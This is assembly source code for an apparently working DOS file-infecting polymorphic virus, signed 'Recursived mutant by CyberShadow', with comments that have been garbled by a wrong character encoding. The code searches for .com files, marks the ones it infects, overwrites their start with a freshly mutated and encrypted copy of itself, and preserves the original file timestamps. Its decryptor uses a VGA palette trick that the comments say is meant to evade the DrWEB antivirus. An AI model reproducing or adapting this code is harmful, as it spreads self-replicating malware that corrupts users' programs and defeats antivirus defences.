   .model tiny
   .code
   org 100h
   ;--------------------------------------

   Const2 = offset EndVirus - offset Start

   Begin:
           jmp short start_1
           db 'CS'
           db 90h
   start_1:
   ;--------------------------------------
   Start:
           sti
           cld
           mov cx,100
           mov si,80h
           mov di,60800
           rep movsb
           mov ax,cs:[old_length]
           push ax
           mov DX,offset Fname          ;¿
           sub CX,CX                    ;³  è«¨ ¯¥p¢®¥ ¨¬ï ä ©« .
           mov AH,4eh                   ;³
           int 21h                      ;Ù
   Next:
           cmp word ptr ds:[9ah],60000  ;¿ ¤«¨  ¡®«ìè¥ 60000 ¡ ©â
           jna no_exit                  ;Ù ¤ -¢ë¢ «¨¢ ¥¬áï
   yes_exit:
           jmp find_next
   no_exit:
           cmp word ptr ds:[9ah],4001
           jbe yes_exit
           mov DX,80h+1eh               ;¿
           mov AX,3d02h                 ;³ ®âªpë«¨ ä ©«.
           int 21h                      ;³
           jc yes_exit                  ;³
           mov BX,AX                    ;Ù
   ;      --------------------------------
           mov DX,61000                 ;¿
           mov si,dx                    ;³
           mov CX,4000                  ;³ ç¨â ¥¬ ¯¥p¢ë¥ ¡ ©âë
           mov AH,3fh                   ;³
           int 21h                      ;Ù
   ;      --------------------------------
           cmp word ptr ds:[si+3],'SC'  ;¿ ¯à®¢¥à¨¬áï   § à ¦¥¨¥
           je close_file                ;Ù ¤ -¢ë¢ «¨¢ ¥¬áï
           cmp byte ptr ds:[si],'M'     ;¿   ¥ EXE-è¨ª «¨ ã  á?
           je close_file                ;Ù ¤ -¢ë¢ «¨¢ ¥¬áï
           cmp byte ptr ds:[si],'Z'     ;¿   ¥ EXE-è¨ª «¨ ã  á?
           je close_file                ;Ù ¤ -¢ë¢ «¨¢ ¥¬áï
           mov ax,5700h                 ;¿
           int 21h                      ;³ á®åà ¨«¨ ¢à¥¬ï ¨ ¤ âã ä ©« 
           push dx                      ;³
           push cx                      ;Ù
           mov AL,2                     ;¿
           call Proc1                   ;³ ¯¥p¥¬¥áâ¨«¨áì   ª®¥æ ä ©« 
           inc ah
           mov [old_length],AX          ;Ù
           push bx
           call rnd                     ;¿
           pop bx                       ;³
           and ax,511                   ;³ ‘®åà ¨¬  ç «®
           mov dx,61000                 ;³ ¤®¡ ¢¨¢ ª ¥¬ã ç¥£®-¨¡ã¤ì
           mov cx,4000                  ;³ ¯® RND
           add cx,ax                    ;³
           mov ah,40h                   ;³
           int 21h                      ;Ù
           xor al,al
           call Proc1
           push si di bx bp             ;‘®åà ¨¬ à¥£¨
           call rnd
           mov cx,const2                ;ª ª®© ¤«¨ë
           and ax,31
           add cx,ax
           mov si,offset start          ;®âªã¤  ¡à âì ª®¤ ¢¨à¨ï
           mov di,62000                 ;ªã¤ë ¥£® á®¢ âì ¢ ¨§¢à â®¬ ¢¨¤¥
           call mutant                  ;¬®àä¥¬ ¥£®
           pop bp bx di si              ;¢®ááâ ®¢¨¬ à¥£¨
   ;      --------------------------------
           mov AH,40h                   ;¿ § ¯¨á «¨ â¥«® ¢¨àãá 
           int 21h                      ;Ù
   ;      --------------------------------
           pop cx                       ;¿ ¢®ááâ ®¢¨«¨ ¢à¥¬ï ¨ ¤ âã
           pop dx                       ;³
           mov ax,5701h                 ;³
           int 21h                      ;Ù
   close_file:
           mov AH,3eh                   ;¿ § ªpë«¨ ä ©«
           int 21h                      ;Ù
   ;      --------------------------------
   find_next:
           mov AH,4fh                   ;³
           int 21h                      ;³ á«¥¤ãîé¨© ä ©«
           jc exit                      ;Ù
           jmp next
   ;--------------------------------------
   exit:
           mov cx,100
           mov di,80h
           mov si,60800
           rep movsb
           mov bx,61000
           pop si
           mov word ptr cs:[bx],0a4f3h
           mov byte ptr cs:[bx+2],0c3h
           mov di,100h
           mov cx,4000
           push di
           push bx
           ret
           db 'Recursived mutant by CyberShadow...' ; ¤¥æ¨«ìë© ª®¯¨à ©â
   ;--------------------------------------
   Proc1:
           sub DX,DX                    ;- Šãàá®à ¢ ä ©«
           sub CX,CX                    ;
           mov AH,42h                   ;
           int 21h                      ;
           ret                          ;
   ;--------------------------------------
   ;’ ª, ¬®© ¯®«¨¬®àä ®â«¨ç ¥âáï á«¥¤ãîé¥© ®á®¡¥®áâìî: á«ãç ©ë¥ ª®¬ ¤ë ¥
   ;¨§¬¥ïîâ à¥£¨áâà®¢, çâ® ¯®§¢®«¨«® ã¯à®áâ¨âì  «£®à¨â¬ ¨ à §®®¡à §¨âì  ¡®à
   ;ª®¬¬ ¤, å®âï ¨ ã¯à®áâ¨«®  å®¦¤¥¨¥ ¢¨àãá 

   mutant:
           call m_adress                ;€£ , á ¬®ñ ¨â¥à¥á®ñ!
   m_adress:
           pop bp                       ;Ž¯à¥¤¥«¨«  ç.  ¤à¥á
           push di cx si di
           in al,40h                    ;—¥¬ ¡ã¤¥¬ ªá®à¨âì
           mov cs:[bp+offset cr_1-offset m_adress-1],al
           call rnd
           mov cs:[bp+offset cr_cs-offset m_adress-1],al
           mov cs:[bp+offset cr_cs_1-offset m_adress-1],al
           mov cs:[bp+offset cr_cs_2-offset m_adress-1],al
           mov si,bp
           add si,offset crypted-offset m_adress ;Ž¯à¥¤¥«¨«¨  ¤à¥á   à áè¨äà®¢é¨ª
           mov al,0e8h                  ;‡ ¯¨å «¨ CALL   à áè¨äà®¢é¨ª
           stosb
           mov ax,cx
           inc ax
           inc ax
           stosw
           mov ax,'SC'
           stosw
           mov cs:[bp+offset tmp_1-offset m_adress],di ;¨ § ¯®¬¨«¨ ªã¤  áª« ¤ë¢ âì § è¨äà®¢ ë© ¢¨àãá
           add di,cx              ;âíªá, â¥¯¥àì ¬®àä¥¬ à áè¨äà®¢é¨ª
           mov al,0FAh
           stosb
   crypted_1:
           call poly
           lodsb
           or al,al
           je crypted_cs_1
   crypted_cs:
           movsb
           dec al
           jne crypted_cs
           jmp short crypted_1
   crypted_cs_1:
           movsw
           mov byte ptr cs:[bp+offset no_flag-offset m_adress],1
           call poly
           movsw
           push di
           call poly
           movsw                           ;add ah,64
           movsb
           pop bx
           mov dx,di
           sub dx,bx
           mov byte ptr cs:[bx-1],dl
           call poly                    ;¨ â.¤.
           push di
           movsw
           movsb
           call poly
           movsb
           call poly
           movsw            ;add ah,0 ¤®¡ ¢¨«ª  ª ªá®à¨«ª¥
           push si
           call rnd
           pop si
           stosb
           mov cs:[bp+offset add_crypt-offset m_adress],al
           inc si
           call poly
           movsb            ; dec cx
           mov byte ptr cs:[bp+offset no_flag-offset m_adress],1
           call poly
           movsw            ;je cr_exit
           movsb            ;jmp cr_3
           mov cx,di
           pop bx
           sub cx,bx
           mov ax,65534
           sub ax,cx
           stosw
           inc si
           inc si
           call poly
           movsw
           pop bx
           pop si cx
           pop dx
           push di                ;˜¨äà ¥¬ â¥«® ¢¨àãá 
           mov di,cs:[bp+offset tmp_1-offset m_adress]
           mov ah,cs:[bp+offset cr_1-offset m_adress-1]
   crypt_body:
           lodsb
           xor al,ah
           add ah,cs:[bp+offset add_crypt-offset m_adress]
           stosb
           loop crypt_body
           pop di
           mov ax,di
           sub ax,dx
           mov cx,ax
           ret
   poly:
           push si bx ax cx
           call rnd
           and bx,15
           inc bl
           xor ch,ch
           mov cl,bl
   poly_1:
           push cx
           call poly_command
           pop cx
           loop poly_1
           pop cx ax bx si
           mov byte ptr cs:[bp+offset no_flag-offset m_adress],0
           mov byte ptr cs:[bp+offset no_push-offset m_adress],0
           ret
   poly_com:
           cmp byte ptr cs:[bp+offset recurs_tmp-offset m_adress],8
           jae poly_com_1
           inc byte ptr cs:[bp+offset recurs_tmp-offset m_adress]
           mov byte ptr cs:[bp+offset no_push-offset m_adress],1
           call poly_command
   poly_com_1:
           dec byte ptr cs:[bp+offset recurs_tmp-offset m_adress]
           ret
   poly_command:
           call rnd
           and bx,15
           shl bx,1
           call poly_2
   poly_start:                     ; ¡®à ¡«®ª®¢ ª®¬¬ ¤ (¥çâ®, ª®¬¬ ¤ ¯®¤ N¤æ âì ¯®«ãç ¥âáï!)
           dw offset block_0-offset poly_start
           dw offset block_1-offset poly_start
           dw offset block_2-offset poly_start
           dw offset block_3-offset poly_start
           dw offset block_4-offset poly_start
           dw offset block_5-offset poly_start
           dw offset block_6-offset poly_start
           dw offset block_7-offset poly_start
           dw offset block_8-offset poly_start
           dw offset block_9-offset poly_start
           dw offset block_10-offset poly_start
           dw offset block_11-offset poly_start
           dw offset block_12-offset poly_start
           dw offset block_13-offset poly_start
           dw offset block_14-offset poly_start
           dw offset block_15-offset poly_start
   poly_2:
           pop si
           mov bx,cs:[si+bx]
           add bx,si
           jmp bx
   block_0:
           mov ax,00ebh
           stosw
           ret
   block_1:
           mov al,8bh
           stosb
           call rnd
           and al,7
           mov bl,al
           shl al,3
           add al,bl
           add al,0c0h
           stosb
           ret
   block_2:
           cmp byte ptr cs:[bp+offset no_push-offset m_adress],1
           je block_1
           call rnd
           and al,7
           add al,50h
           stosb
           push ax
           call poly_com
           pop ax
           add al,8
           stosb
           ret
   block_3:
           call block_3_
           dw 90cch
   block_3_:
           pop bx
           mov ax,cs:[bx]
           xchg al,ah
           mov cs:[bx],ax
           stosw
           ret
   no_flags_set:
           push si
           call rnd
           pop si
           and bx,3
           shl bx,1
           mov bx,cs:[si+bx]
           add bx,si
           call bx
           ret
   block_4:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           jne no_flags_set
           mov al,81h
           stosb
           call rnd
           and al,7
           add al,0f8h
           stosb
           call rnd
           mov ah,al
           call rnd
           stosw
           ret
   block_5:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           jne no_flags_set
           mov al,81h
           stosb
           call rnd
           and al,7
           add al,0f0h
           stosb
           push ax
           call rnd
           push ax
           stosw
           call poly_com
           pop bx
           mov al,81h
           stosb
           pop ax
           stosb
           mov ax,bx
           stosw
           ret
   block_6:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           jne no_flags_set
           mov al,81h
           stosb
           call rnd
           and al,7
           push ax
           add al,0e8h
           stosb
           call rnd
           mov ah,al
           call rnd
           stosw
           push ax
           call poly_com
           pop bx
           mov al,81h
           stosb
           pop ax
           add al,0c0h
           stosb
           mov ax,bx
           stosw
           ret
   block_7:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je no_flags_set_block_7
           jmp no_flags_set
   no_flags_set_block_7:
           call rnd
           and al,7
           add al,40h
           stosb
           push ax
           call poly_com
           pop ax
           add al,8
           stosb
           ret
   block_8:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_8
           jmp no_flags_set
   flags_set_8:
           mov cl,3bh
           call rnd
           cmp ax,127
           ja short flags_set_8_1
           mov cl,3ah
   flags_set_8_1:
           mov al,cl
           stosb
           call rnd
           and al,63
           add al,0c0h
           stosb
           ret
   block_9:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_9
           jmp no_flags_set
   flags_set_9:
           mov al,0bh
           stosb
           call rnd
           and al,7
           mov bl,al
           shl al,3
           add al,bl
           add al,0c0h
           stosb
           ret
   block_10:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_10
           jmp no_flags_set
   flags_set_10:
           call rnd
           and bx,7
           call block_10_1
           db 0f5h,0f8h,0f9h,0fah,0fch,0fdh,90h,0cch
   block_10_1:
           pop si
           mov al,cs:[si+bx]
           stosb
           ret
   block_11:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_11
           jmp no_flags_set
   flags_set_11:
           mov al,0ah
           stosb
           call rnd
           and ax,7
           mov bl,al
           shl al,3
           add al,bl
           add al,0c0h
           stosb
           ret
   block_12:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_12
           jmp no_flags_set
   flags_set_12:
           mov al,85h
   flags_set_1213:
           stosb
           call rnd
           and ax,63
           add al,0c0h
           stosb
           ret
   block_13:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_13
           jmp no_flags_set
   flags_set_13:
           mov al,84h
           jmp short flags_set_1213

   block_14:
           cmp byte ptr cs:[bp+offset no_flag-offset m_adress],0
           je flags_set_14
           jmp no_flags_set
   flags_set_14:
           mov al,80h
           stosb
           call rnd
           and al,7
           add al,0f0h
           stosb
           push ax
           call rnd
           stosb
           push ax
           call poly_com
           pop bx
           mov al,80h
           stosb
           pop ax
           stosb
           mov ax,bx
           stosb
           ret
   block_15:
           jmp block_10
   rnd:
           call rnd_1
           db 103
           db 220
           db 30
   rnd_1:
           pop si
           mov al,cs:[si]
           add al,cs:[si+1]
           mov cs:[si],al
           add al,cs:[si+2]
           mov cs:[si+1],al
           ror al,1
           mov cs:[si+2],al
           xor bh,bh
           mov bl,al
           ret
   crypted:                        ;á®¡áâ¢¥® à áè¨äà®¢é¨ª
           db 3
           mov cx,Const2           ;3 -¤«¨ë ª®¬¬ ¤
           db 1
           pop si                  ;1
           db 2
           xor bp,bp               ;2
           db 3
           add si,2                ;3
           db 2
           mov ah,0                ;2
   cr_1:                                   ;new fuck for DrWEB
           db 3
           mov dx,3c7h             ;3        ;palette init for read
           db 2
           mov al,0                ;2
   cr_cs:
           db 1
           out dx,al               ;1
           db 1
           inc dx                  ;1
           db 1
           inc dx                  ;1
           db 1
           in al,dx                ;1      ;read it!
           db 1
           in al,dx                ;1      ;read it!
           db 1
           in al,dx                ;1      ;read it!
           db 2
           inc al                  ;1      ;change it
           db 2
           and al,63               ;2
           db 2
           mov bh,al               ;2      ;push it
           db 1
           dec dx                  ;1
           db 2
           mov al,0                ;2      ;palette init for write
   cr_cs_1:
           db 1
           out dx,al               ;1
           db 1
           inc dx                  ;1
           db 2
           mov al,bh               ;2
           db 1
           out dx,al               ;1      ;write it!
           db 1
           out dx,al               ;1      ;write it!
           db 1
           out dx,al               ;1      ;write it!
           db 1
           dec dx                  ;1
           db 1
           dec dx                  ;1
           db 2
           mov al,0                ;2      ;palette init for read again
   cr_cs_2:
           db 1
           out dx,al               ;1
           db 1
           inc dx                  ;1
           db 1
           inc dx                  ;1
           db 1
           in al,dx                ;1      ;read it! (fuck, i hate comments...)
           db 1
           in al,dx                ;1      ;read it! (fuck, i hate comments...)
           db 1
           in al,dx                ;1      ;read it! (fuck, i hate comments...)
           db 0
           cmp al,bh               ;2      ;so, dear DrWEB 4.03, could you did it?
           je cr_3                 ;2      ;We under DOS, no DrWEB
           add ah,64               ;3      ;AHA, let's fuck DrWEB !!!!!!!!!!!!!
   cr_3:
           xor cs:[bp+si],ah       ;3
           inc bp                  ;1
           add ah,0                ;3

           dec cx                  ;1
           je short cr_exit        ;2
           db 0e9h,0,0             ;3
   cr_exit:
           jmp si                  ;2
   Fname           db '*.com',0         ; ¬ áª  ä ©« 
   no_flag db 0
   no_push db 0
   add_crypt db 0
   tmp_1 dw 0
   recurs_tmp db 0
   old_length dw 0

   EndVirus:                            ; ˆ “‘… !!!!
   ;--------------------------------------
   end begin
